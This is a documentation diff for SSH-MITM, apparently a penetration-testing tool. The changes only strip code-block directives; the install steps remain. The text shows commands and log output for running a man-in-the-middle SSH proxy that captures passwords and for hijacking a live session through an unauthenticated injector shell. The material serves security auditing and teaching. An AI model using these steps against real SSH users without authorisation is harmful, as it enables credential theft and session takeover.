@@ -29,9 +29,6 @@ The first step to using any software package is getting it properly installed.
 
 To install SSH-MITM, simply run this simple command in your terminal of choice:
 
-.. code-block:: bash
-    :linenos:
-
     $ python -m pip install ssh-mitm
 
 
@@ -42,23 +39,14 @@ SSH-MITM is actively developed on GitHub, where the code is always available.
 
 You can either clone the public repository:
 
-.. code-block:: bash
-    :linenos:
-
     $ git clone git://github.com/ssh-mitm/ssh-mitm.git
 
 Or, download the tarball:
-
-.. code-block:: bash
-    :linenos:
 
     $ curl -L https://github.com/ssh-mitm/ssh-mitm/archive/master.tar.gz | tar xz
 
 
 Once you have a copy of the source, you can embed it in your own Python package, or install it into your site-packages easily:
-
-.. code-block:: bash
-    :linenos:
 
     $ cd ssh-mitm-master
     $ python -m pip install .
@@ -83,24 +71,14 @@ Starting an intercepting mitm-ssh server with password authentication is very si
 
 All you have to do is run this command in your terminal of choice.
 
-.. code-block:: bash
-    :linenos:
-
     $ ssh-mitm --remote-host 192.168.0.x
 
 Now let's try to connect to the ssh-mitm server.
 The ssh-mitm server is listening on port 10022.
 
-.. code-block:: bash
-    :linenos:
-
     $ ssh -p 10022 user@proxyserver
 
 You will see the credentials in the log output.
-
-
-.. code-block:: none
-    :linenos:
 
     2021-01-01 11:38:26,098 [INFO]  Client connection established with parameters:
         Remote Address: 192.168.0.x
@@ -119,30 +97,18 @@ SSH-MITM proxy server is able to hijack a ssh session and allows you to interact
 
 Let's get startet with hijacking the session.
 
-.. code-block:: bash
-    :linenos:
-
     $ ssh-mitm --remote-host 192.168.0.x --ssh-interface ssh_proxy_server.plugins.ssh.mirrorshell.SSHMirrorForwarder
 
 Connect your ssh client with the ssh-mitm proxy.
-
-.. code-block:: bash
-    :linenos:
 
     $ ssh -p 10022 user@proxyserver
 
 When a client connects, the ssh-mitm proxy server starts a new server, where you can connect with another ssh client.
 This server is used to hijack the session.
 
-.. code-block:: none
-    :linenos:
-
     2021-01-01 11:42:43,699 [INFO]  created injector shell on port 34463. connect with: ssh -p 34463 127.0.0.1
 
 To hijack the session, you can use your favorite ssh client. This connection does not require authentication.
-
-.. code-block:: bash
-    :linenos:
 
     $ ssh -p 34463 127.0.0.1
 
